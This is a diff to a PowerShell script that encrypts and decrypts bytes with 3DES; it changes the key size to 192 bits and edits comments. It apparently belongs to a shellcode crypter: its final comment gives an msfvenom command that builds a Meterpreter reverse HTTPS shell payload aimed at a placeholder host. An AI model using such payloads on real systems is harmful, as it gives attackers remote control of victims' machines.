@@ -35,12 +35,11 @@ function Format-ByteArrayToHex($Bytes, $VarName) {
 function Encrypt-Bytes($Bytes, $Key, $IV) {
     $3des = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
 
-    # 128-bit / 192-bit
-    $3des.KeySize = 128
+    # 128-bit | 192-bit
+    $3des.KeySize = 192
 
-    # Does not change between 128/192 key lengths
+    # Does not change between 128/192-bit key lengths
     $3des.BlockSize = 64
-    
     $3des.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
     $3des.key = $Key
     $3des.IV = $IV
@@ -55,25 +54,26 @@ function Encrypt-Bytes($Bytes, $Key, $IV) {
 
 function Decrypt-Bytes($Bytes, $Key, $IV) {
     $3des = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
-    $3des.KeySize = 128
+    $3des.KeySize = 192
     $3des.BlockSize = 64
 
     # Keep this in mind when you view your decrypted content as the size will likely be different
     $3des.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-
     $3des.key = $Key
     $3des.IV = $IV
 
     $decryptor = $3des.CreateDecryptor($3des.Key, $3des.IV)
-    $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 
+    $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
+    
+    # If you keep powershell open this will stay in memory 
     $3des.Dispose()
     return $decrypted
 }
 
-# 16 Bytes > 3DES-128 | 24 Bytes > 3DES-192
-[Byte[]]$Key = Get-RandomBytes -Size 16
+# 16 Bytes > 128-bit | 24 Bytes > 192-bit
+[Byte[]]$Key = Get-RandomBytes -Size 24
 
-# Does not change between 128/192 key lengths
+# Does not change between 128/192-bit key lengths
 [Byte[]]$IV = Get-RandomBytes -Size 8
 
 # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f ps1 -v payload
